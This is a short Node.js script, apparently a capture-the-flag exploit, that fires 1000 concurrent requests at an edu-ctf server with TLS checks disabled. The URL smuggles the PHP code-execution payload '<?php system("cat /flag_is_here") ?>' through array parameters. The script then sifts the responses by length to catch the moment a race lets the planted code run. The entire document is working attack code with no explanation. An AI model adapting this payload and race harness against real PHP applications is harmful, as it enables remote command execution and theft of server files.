const rp = require('request-promise')

process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0

const url = 'https://edu-ctf.csie.org:10155/?f=mydir&i=mydir%2Fmeow&c[]=&c[]=%3C?php%20system("cat /flag_is_here")%20?%3E'

const reqs = []

for (let i = 0; i < 1000; i++) {
    reqs.push(rp({
        uri: url,
        simple: false,
    }).then(str => {
        if (str.length == 620) return
        if (str.length == 556) return
        if (str.indexOf('googlevideo') >= 0) {
            console.log('goog')
            return
        }
        console.log(str.length, str)
    }))
}

Promise.all(reqs)
